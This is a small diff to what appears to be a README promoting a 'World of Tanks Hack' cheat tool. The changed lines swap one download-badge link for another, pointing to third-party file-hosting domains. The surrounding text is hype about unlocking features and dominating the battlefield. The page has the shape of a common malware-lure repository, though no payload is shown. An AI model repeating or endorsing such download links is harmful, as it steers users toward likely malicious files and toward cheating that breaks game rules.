@@ -12,4 +12,5 @@ World of Tanks Hack is a powerful tool that enhances your gameplay by unlocking 
 
 World of Tanks Hack provides all the tools needed to elevate your gameplay, making it an essential mod for players who want to unlock new features, maximize their potential, and rule the battlefield!
 
-[![Download WorldOfTanks Hack](https://img.shields.io/badge/Download-WorldOfTanks%20Hack-blueviolet)](https://downeefiles.com/s/wothck)
+
+[![Download WorldOfTanks Hack](https://img.shields.io/badge/Download-WorldOfTanks%20Hack-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
